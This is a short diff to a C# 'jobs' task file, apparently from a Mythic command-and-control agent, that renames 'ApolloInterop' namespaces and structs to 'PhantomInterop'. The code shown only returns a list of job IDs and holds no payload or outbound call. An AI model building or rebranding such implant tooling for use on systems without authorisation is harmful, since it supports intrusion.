@@ -6,9 +6,9 @@
 
 #if JOBS
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Collections.Generic;
 
 namespace Tasks
@@ -33,7 +33,7 @@ namespace Tasks
             }
 
             MythicTaskResponse resp = CreateTaskResponse("", true, "completed");
-            resp.ProcessResponse = new ApolloInterop.Structs.ApolloStructs.ProcessResponse
+            resp.ProcessResponse = new PhantomInterop.Structs.PhantomStructs.ProcessResponse
             {
                 Jobs = realJids.ToArray()
             };
